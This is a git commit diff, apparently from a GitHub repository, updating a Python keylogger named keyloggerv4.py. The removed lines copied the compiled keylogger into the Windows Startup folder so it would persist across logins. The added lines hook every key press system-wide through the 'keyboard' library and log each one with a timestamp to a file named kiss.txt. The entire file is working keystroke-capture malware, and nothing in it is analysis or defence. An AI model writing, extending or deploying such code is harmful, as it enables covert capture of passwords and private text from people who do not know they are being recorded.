4eb77864e3a2d3cd6030e64f91eda4bc2c867fd5
Trevor <96876149+jason1343@users.noreply.github.com>
2023-06-02 09:42:10 +0900

    Update keyloggerv4.py

--- LIPROBBER-0220/keyloggerv4.py
+++ LIPROBBER-0220/keyloggerv4.py
@@ -1,20 +1,15 @@
-import os
-import shutil
 from pynput.keyboard import Listener
+import keyboard
 import logging
-
-listapp=os.listdir("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp")
-
-if "keyloggerv4.exe" not in listapp:
-    src_path = r"./keyloggerv4.exe"
-    dst_path = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
-    shutil.copy(src_path, dst_path)
 
 logging.basicConfig(filename='./kiss.txt', level=logging.DEBUG, format='[%(asctime)s], %(message)s')
 
-def on_press(key):
-    logging.info('{0}'.format(key))
-        
+def on_press(event):
+    key = event.name
+    print(key)
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+    logging.info('{0}'.format(key))
+
+
+keyboard.on_press(on_press)
+keyboard.wait()
